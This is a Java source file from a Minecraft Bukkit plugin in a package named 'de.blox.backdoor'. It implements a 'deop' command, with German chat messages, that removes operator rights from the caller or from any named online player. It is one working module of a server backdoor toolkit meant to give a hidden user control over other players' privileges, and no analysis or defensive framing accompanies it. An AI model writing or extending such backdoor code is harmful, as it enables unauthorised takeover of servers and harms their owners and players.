package de.blox.backdoor.commands.implement;

import de.blox.backdoor.commands.AbstractCommand;
import de.blox.backdoor.core.Core;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;


public class DeopCommand extends AbstractCommand {

    public DeopCommand() {
        super("Deop you or other", "deop [<Spielername>]", "deop");
    }

    @Override
    public void processCommand(Player player, String line, String[] args) {
        if (args.length == 0) {
            player.setOp(false);
            player.sendMessage(Core.getInstance().getPrefix() + "§aDu hast jetzt keine Operator Rechte mehr!");
            return;
        } else if (args.length == 1) {
            String targetName = args[0];

            Player target = Bukkit.getPlayer(targetName);
            if (target == null) {
                player.sendMessage(Core.getInstance().getPrefix() + "§cDer Spieler §6" + targetName + " §7ist nicht online!");
                return;
            }

            target.setOp(false);
            player.sendMessage(Core.getInstance().getPrefix() + "§7Du hast den Spieler §6" + targetName + " §7die Operator Rechte entfernt.");
        }

        player.sendMessage(Core.getInstance().getPrefix() + "Bitte benutze: §c" + this.usage());
    }

    @Override
    public boolean mustRegistered() {
        return true;
    }

}
